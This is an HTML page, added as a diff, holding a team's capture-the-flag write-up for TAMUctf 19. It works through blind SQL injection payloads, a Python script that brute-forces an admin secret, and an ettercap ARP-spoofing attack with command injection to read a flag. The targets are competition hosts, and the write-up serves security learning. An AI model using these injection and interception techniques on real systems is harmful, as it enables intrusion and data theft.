@@ -1,0 +1,310 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>TAMUctf 19</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#bird-box-challenge">bird-box-challenge</a>
+    
+                <a class="dropdown-item" href="#1337-secur1ty">1337-secur1ty</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                network/pentest
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#copper">copper</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#bird-box-challenge" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">bird-box-challenge</span>
+            </a>
+    
+<a href="#1337-secur1ty" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">1337-secur1ty</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">network/pentest</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#copper" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">copper</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="tamuctf-19"><a class="header-link" href="#tamuctf-19"></a>TAMUctf 19</h1>
+
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="bird-box-challenge"><a class="header-link" href="#bird-box-challenge"></a>Bird Box Challenge</h3>
+<blockquote>
+<p>bookgin</p>
+</blockquote>
+<p>This is a blind SQL injection challenge.</p>
+<pre class="hljs"><code>curl <span class="hljs-string">"http://web2.tamuctf.com/Search.php?Search='</span>%<span class="hljs-number">20</span><span class="hljs-built_in">or</span>%<span class="hljs-number">20</span><span class="hljs-string">''</span>=<span class="hljs-string">'"</span> -sD -
+curl <span class="hljs-string">"http://web2.tamuctf.com/Search.php?Search='</span><span class="hljs-string">" -sD -
+curl "</span>http:<span class="hljs-comment">//web2.tamuctf.com/Search.php?Search=1" -sD -</span></code></pre><ul class="list">
+<li>SQL syntax error: HTTP 200</li>
+<li>true: HTTP 500 + Nice try, nothing to see here.</li>
+<li>false: HTTP 500 + Our search isn&#39;t THAT good...</li>
+</ul>
+<p>The HTTP status code is manipulated intentionally.</p>
+<p>My payload to retrive all the information:</p>
+<pre class="hljs"><code>' or (<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> ((<span class="hljs-keyword">select</span> table_schema,table_name,column_name <span class="hljs-keyword">FROM</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema!=<span class="hljs-string">'mysql'</span> <span class="hljs-keyword">and</span> table_schema!=<span class="hljs-string">'information_schema'</span> <span class="hljs-keyword">and</span> table_schema !=<span class="hljs-string">'sys'</span> <span class="hljs-keyword">and</span> table_schema !=<span class="hljs-string">'performance_schema'</span>) <span class="hljs-keyword">as</span> foo)) <span class="hljs-keyword">like</span> <span class="hljs-built_in">binary</span> <span class="hljs-string">"items"</span> ) <span class="hljs-keyword">and</span> <span class="hljs-string">''</span>=<span class="hljs-string">'</span></code></pre><ul class="list">
+<li>version: <code>5.7.25-0ubuntu0.18.04.2</code></li>
+<li>Database: sqlidb</li>
+<li>Table: Search</li>
+<li>Columns: items</li>
+<li>Rows: <code>Aggies</code>, <code>Trucks</code>, and <code>Eggs</code></li>
+</ul>
+<p>So where is the flag? Hmm... it takes me a few hours to realize that it&#39;s hided in the <code>user()</code> ....</p>
+<p><code>gigem{w3_4r3_th3_4ggi3s}@localhost</code></p>
+<h3 id="1337-secur1ty"><a class="header-link" href="#1337-secur1ty"></a>1337 Secur1ty</h3>
+<blockquote>
+<p>bookgin, KennyTseng</p>
+</blockquote>
+<p>Yey another SQL injnection challenge.</p>
+<pre class="hljs"><code><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/web6.tamuctf.com/message</span>?id=<span class="hljs-string">' or '</span><span class="hljs-string">'='</span></code></pre><p>To get the table names and column names first:</p>
+<pre class="hljs"><code>' or (<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> ((<span class="hljs-keyword">select</span> table_schema,table_name,column_name <span class="hljs-keyword">FROM</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema!=<span class="hljs-string">'mysql'</span> <span class="hljs-keyword">and</span> table_schema!=<span class="hljs-string">'information_schema'</span> <span class="hljs-keyword">and</span> table_schema !=<span class="hljs-string">'sys'</span> <span class="hljs-keyword">and</span> table_schema !=<span class="hljs-string">'performance_schema'</span> <span class="hljs-keyword">and</span> table_name != <span class="hljs-string">'Messages'</span> <span class="hljs-keyword">and</span> table_name != <span class="hljs-string">'Users'</span>) <span class="hljs-keyword">as</span> foo) <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>) <span class="hljs-keyword">like</span> <span class="hljs-string">"foo%"</span> ) <span class="hljs-keyword">and</span> <span class="hljs-string">''</span>=<span class="hljs-string">'</span></code></pre><p>My script to retrieve admin&#39;s secret:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+
+<span class="hljs-keyword">import</span> requests
+s = requests.session()
+cookies = dict(userid=<span class="hljs-string">'3'</span>, secret=<span class="hljs-string">'6IY7TNFKAVT5FNGK'</span>)
+
+t = <span class="hljs-string">''</span>
+<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-.'</span>:
+        print(t)
+        payload = f<span class="hljs-string">'''
+' or 
+(select (select secret from Users where username = "1337-admin") like "{t+i}%")
+ and ''='
+'''</span>.replace(<span class="hljs-string">'\n'</span>, <span class="hljs-string">''</span>)
+        r = s.get(<span class="hljs-string">'http://web6.tamuctf.com/message'</span>, params=dict(id=payload), cookies=cookies)
+        <span class="hljs-keyword">if</span> <span class="hljs-string">'we need to talk about the cookies'</span> <span class="hljs-keyword">in</span> r.text:
+            print(<span class="hljs-keyword">True</span>)
+            t+=i
+            print(t)
+            <span class="hljs-keyword">break</span>
+        <span class="hljs-keyword">elif</span> <span class="hljs-string">'//'</span> <span class="hljs-keyword">in</span> r.text:
+            print(<span class="hljs-keyword">False</span>)
+        <span class="hljs-keyword">else</span>:
+            print(<span class="hljs-string">'syntax error'</span>)</code></pre><pre class="hljs"><code>$ curl <span class="hljs-string">'http://web6.tamuctf.com/'</span> --cookie <span class="hljs-string">'userid=1; secret=WIFHXDZ3BOHJMJSC'</span>
+
+<span class="hljs-comment"># gigem{th3_T0tp_1s_we4k_w1tH_yoU}</span></code></pre><h4 id="failed-attempts"><a class="header-link" href="#failed-attempts"></a>Failed Attempts</h4>
+<ul class="list">
+<li>XSS: No it&#39;s not. The message body escapes the html properly.</li>
+<li>SQL injection in registering, editing information, cookies</li>
+</ul>
+<h2 id="network/pentest"><a class="header-link" href="#network/pentest"></a>Network/Pentest</h2>
+<h3 id="copper"><a class="header-link" href="#copper"></a>Copper</h3>
+<p>After connect VPN by <code>sudo openvpn --config copper.ovpn</code>, I scan the open subnet by <code>nmap -privileged -v 172.30.0.0/28</code>.</p>
+<pre class="hljs"><code><span class="hljs-number">172.30</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>
+<span class="hljs-number">8080</span>/tcp open http-proxy
+
+<span class="hljs-number">172.30</span><span class="hljs-number">.0</span><span class="hljs-number">.3</span></code></pre><p>Then, I use the commands below to catch and format the bridged packets.</p>
+<pre class="hljs"><code>$ ettercap -T -t tcp -M arp:remote /<span class="hljs-number">172.30</span><span class="hljs-meta">.0</span><span class="hljs-meta">.2</span>// /<span class="hljs-number">172.30</span><span class="hljs-meta">.0</span><span class="hljs-meta">.3</span>// -L Sam
+$ etterlog -n -s Sam.ecp -F tcp:<span class="hljs-number">172.30</span><span class="hljs-meta">.0</span><span class="hljs-meta">.3</span>:<span class="hljs-number">33230</span>:<span class="hljs-number">172.30</span><span class="hljs-meta">.0</span><span class="hljs-meta">.2</span>:<span class="hljs-number">6023</span> &gt;Sam.log.noheader</code></pre><p>Just a peek over <code>Sam.log.noheader</code></p>
+<pre class="hljs"><code>YiqMxpZQz+<span class="hljs-number">5</span>dPf+<span class="hljs-attr">qELowBw==</span> 
+<span class="hljs-attr">US5MJOeTx6L69iQT3Y8B9g==</span> 
+<span class="hljs-number">83</span>jbJmmZc/<span class="hljs-attr">RUXML8GcGuVg==</span> 
+<span class="hljs-attr">h8zZvECdaFr730Mgo5EgYQ==</span> 
+YiqMxpZQz+<span class="hljs-number">5</span>dPf+<span class="hljs-attr">qELowBw==</span> 
+<span class="hljs-attr">RdGNIA97r2yYuQsdXjbQGA==</span> 
+S+<span class="hljs-number">79</span>/<span class="hljs-number">0</span>xJH6oVAqvGSE+<span class="hljs-attr">Vlw==</span> </code></pre><p>Since the problem describe that the user typed the same commands below over and over, I guess they have something to do with the packet captured.</p>
+<pre class="hljs"><code>ls -la
+date &gt; monitor<span class="hljs-selector-class">.txt</span>
+echo <span class="hljs-string">"========================================="</span> &gt;&gt; monitor<span class="hljs-selector-class">.txt</span>
+echo <span class="hljs-string">"ps -aux"</span> &gt;&gt; monitor<span class="hljs-selector-class">.txt</span>
+ps -aux &gt;&gt; monitor<span class="hljs-selector-class">.txt</span>
+echo <span class="hljs-string">"========================================="</span> &gt;&gt; monitor<span class="hljs-selector-class">.txt</span>
+echo <span class="hljs-string">"df -h"</span> &gt;&gt; monitor<span class="hljs-selector-class">.txt</span>
+df -h &gt;&gt; monitor<span class="hljs-selector-class">.txt</span>
+cp ./monitor<span class="hljs-selector-class">.txt</span> /logs
+exit</code></pre><p>Suprisingly, that&#39;s true.</p>
+<pre class="hljs"><code>YiqMxpZQz+<span class="hljs-number">5</span>dPf+<span class="hljs-attr">qELowBw==</span> l
+<span class="hljs-attr">US5MJOeTx6L69iQT3Y8B9g==</span> s
+<span class="hljs-number">83</span>jbJmmZc/<span class="hljs-attr">RUXML8GcGuVg==</span> ' '
+<span class="hljs-attr">h8zZvECdaFr730Mgo5EgYQ==</span> -
+YiqMxpZQz+<span class="hljs-number">5</span>dPf+<span class="hljs-attr">qELowBw==</span> l
+<span class="hljs-attr">RdGNIA97r2yYuQsdXjbQGA==</span> a
+S+<span class="hljs-number">79</span>/<span class="hljs-number">0</span>xJH6oVAqvGSE+<span class="hljs-attr">Vlw==</span> &lt;enter&gt;
+
+...</code></pre><p>Therefore, I construct a mapping from character to HASH. Besides, we can view the content of <code>monitor.txt</code> on <code>http://172.30.0.2:8080/monitor.txt</code>.
+Finally, our payload to get the flag before translated would be</p>
+<pre class="hljs"><code><span class="hljs-comment"># Send the hash(payload) to 172.30.0.3:6023</span>
+<span class="hljs-variable">$ </span>cat flag.txt &gt; <span class="hljs-regexp">/logs/h</span>
+<span class="hljs-comment"># If success, we will get response below.</span>
+<span class="hljs-comment"># 92fKIeYPq2HyqG8DSo2Mfw==</span></code></pre><p>Then</p>
+<pre class="hljs"><code><span class="hljs-variable">$ </span>curl <span class="hljs-string">"http://172.30.0.2:8080/h"</span>
+
+<span class="hljs-comment"># gigem{43s_3cb_b4d_a5c452ed22aa5f1a}</span></code></pre>        </article>
+      </div>
+    </div>
+  </body>
+</html>
